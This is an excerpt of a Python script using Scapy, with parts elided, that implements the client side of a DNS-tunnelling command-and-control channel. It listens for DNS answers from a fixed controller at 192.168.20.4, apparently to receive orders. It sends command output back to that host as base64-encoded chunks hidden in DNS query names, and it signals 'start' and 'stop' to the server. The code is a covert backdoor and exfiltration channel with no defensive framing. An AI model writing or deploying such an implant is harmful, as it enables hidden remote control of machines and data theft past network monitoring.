...
def choose_trafic(pkt):
	if(IP in pkt):
		return (pkt['IP'].src == "192.168.20.4")
	else:
		return False
...
def listen_to_order():
	while (True):
		paquet=listen_to_trafic(Portlistener,"192.168.20.4",1)
		for pkt in paquet:
			if(UDP in pkt):
				if pkt.haslayer(DNS):
					if(DNSRR in pkt):
...
def send_return_cmd(data):
	...
	for message in chunks:
			...
			send(IP(dst="192.168.20.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=encode_b64(message)+add_domain_padding())),verbose=0)
	print(chunks)


if __name__ == "__main__":
	# send to server that he can start sending cmd
	sr1(IP(dst="192.168.20.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=encode_b64("start")+add_domain_padding())),verbose=0)
	while(True):
		...
		sr1(IP(dst="192.168.20.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=encode_b64("stop")+add_domain_padding())),verbose=0)
